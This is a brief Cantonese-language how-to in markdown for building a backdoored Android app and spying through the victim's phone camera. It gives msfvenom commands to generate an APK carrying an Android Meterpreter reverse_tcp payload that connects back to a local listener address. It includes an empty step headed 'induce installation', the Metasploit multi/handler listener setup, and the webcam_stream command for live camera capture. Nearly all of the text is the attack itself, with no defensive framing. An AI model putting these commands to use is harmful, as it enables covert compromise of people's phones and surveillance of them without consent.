## 產生 apk 檔案
```sh
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.106 lport=8848 > test.apk
```
* lhost 監聽嘅 hostname
* lport 監聽嘅 port

## 誘導安裝

## 監聽
進入 MSF
```sh
msfconsole
```
開啟監聽
```sh
use exploit/multi/handler
```
```sh
set payload android/meterpreter/reverse_tcp
```
```sh
set lhost 192.168.0.106
```
```sh
run
```
取得鏡頭影像串流
```sh
webcam_stream
```

